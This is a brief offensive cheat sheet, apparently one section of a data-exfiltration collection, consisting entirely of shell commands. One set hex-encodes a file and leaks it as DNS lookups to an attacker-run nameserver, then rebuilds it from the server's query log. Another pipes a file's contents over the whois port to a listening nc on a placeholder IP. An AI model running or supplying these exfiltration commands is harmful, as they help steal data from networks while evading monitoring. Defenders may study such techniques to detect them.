# DNS

## 01 - Unix Shell

### 1.1 - Hex Encoded DNS Exfiltration

```
$ xxd -p file.txt > file.hex

$ for line in `cat file.hex`; do drill $line.<nameserver_dns_server>; done

$ egrep -o [0-9a-f]*.<nameserver_dns_server> /var/lib/bind/query.log | cut -d . -f 1 | uniq > file.hex

$ xxd -r -p file.hex > file.txt
```

### 1.2 - Whois

```
$ whois -h <IP> -p 43 `cat /path/to/file.txt`

$ sudo nc -lnvp 43
```